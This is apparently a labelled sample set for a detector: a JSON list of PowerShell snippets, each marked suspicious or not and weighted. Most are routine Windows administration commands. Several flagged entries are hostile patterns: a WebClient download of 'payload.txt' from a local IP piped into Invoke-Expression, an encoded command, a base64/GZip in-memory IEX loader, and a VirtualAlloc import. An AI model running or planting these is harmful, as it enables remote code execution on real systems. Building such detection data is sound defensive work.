[
  {"text": "Get-Process | Where-Object {$_.CPU -gt 10} | Sort-Object CPU -Descending", "path": "", "suspicious": false, "weight": 8},
  {"text": "Get-Service | Where-Object {$_.Status -eq 'Running'}", "path": "", "suspicious": false, "weight": 8},
  {"text": "Get-EventLog -LogName System -Newest 50", "path": "", "suspicious": false, "weight": 7},
  {"text": "Get-ChildItem -Path C:\\Users -Recurse -Filter *.log | Remove-Item -Force", "path": "C:\\Scripts\\cleanup.ps1", "suspicious": false, "weight": 5},
  {"text": "Import-Module ActiveDirectory\nGet-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select-Object Name, LastLogonDate | Export-Csv C:\\Reports\\stale_users.csv", "path": "C:\\Scripts\\AD\\stale-users.ps1", "suspicious": false, "weight": 6},
  {"text": "Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, @{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N='TotalGB';E={[math]::Round($_.Size/1GB,2)}}", "path": "C:\\Scripts\\disk-check.ps1", "suspicious": false, "weight": 5},
  {"text": "Test-NetConnection -ComputerName dc01.contoso.local -Port 389", "path": "", "suspicious": false, "weight": 4},
  {"text": "Invoke-Command -ComputerName SRV-APP01 -ScriptBlock { Get-Service W3SVC }", "path": "", "suspicious": false, "weight": 4},
  {"text": "New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\\Scripts\\backup.ps1') -Trigger (New-ScheduledTaskTrigger -Daily -At '02:00') | Register-ScheduledTask -TaskName 'DailyBackup'", "path": "C:\\Scripts\\setup-backup-task.ps1", "suspicious": false, "weight": 3},
  {"text": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName", "path": "", "suspicious": false, "weight": 5},
  {"text": "$cred = Get-Credential\nNew-PSSession -ComputerName SRV-DB02 -Credential $cred", "path": "", "suspicious": false, "weight": 3},
  {"text": "Get-Content C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log -Tail 100 | Select-String '500'", "path": "C:\\Scripts\\check-iis-errors.ps1", "suspicious": false, "weight": 4},
  {"text": "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force", "path": "", "suspicious": false, "weight": 2},
  {"text": "Update-Help -Force -ErrorAction SilentlyContinue", "path": "", "suspicious": false, "weight": 3},
  {"text": "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Get-NetIPAddress -AddressFamily IPv4", "path": "", "suspicious": false, "weight": 4},
  {"text": "[System.Reflection.Assembly]::LoadWithPartialName('System.Web')\n$bytes = New-Object byte[] 32\n[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes)\n[Convert]::ToBase64String($bytes)", "path": "", "suspicious": true, "weight": 3},
  {"text": "$client = New-Object System.Net.WebClient\n$client.DownloadString('http://192.168.1.100/payload.txt') | Invoke-Expression", "path": "", "suspicious": true, "weight": 2},
  {"text": "powershell -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==", "path": "", "suspicious": true, "weight": 2},
  {"text": "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAA'))\n$d = New-Object IO.Compression.GZipStream($s,[IO.Compression.CompressionMode]::Decompress)\nIEX (New-Object IO.StreamReader($d)).ReadToEnd()", "path": "", "suspicious": true, "weight": 1},
  {"text": "Add-Type -TypeDefinition @'\nusing System;\nusing System.Runtime.InteropServices;\npublic class WinAPI {\n    [DllImport(\"kernel32.dll\")]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n}\n'@", "path": "", "suspicious": true, "weight": 1},
  {"text": "Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem | Export-Csv C:\\Reports\\computers.csv", "path": "C:\\Scripts\\AD\\inventory.ps1", "suspicious": false, "weight": 4},
  {"text": "Restart-Service -Name Spooler -Force", "path": "", "suspicious": false, "weight": 4},
  {"text": "Get-Counter '\\Processor(_Total)\\% Processor Time' -SampleInterval 2 -MaxSamples 5", "path": "", "suspicious": false, "weight": 3},
  {"text": "Get-WindowsFeature | Where-Object {$_.Installed -eq $true}", "path": "", "suspicious": false, "weight": 3}
]
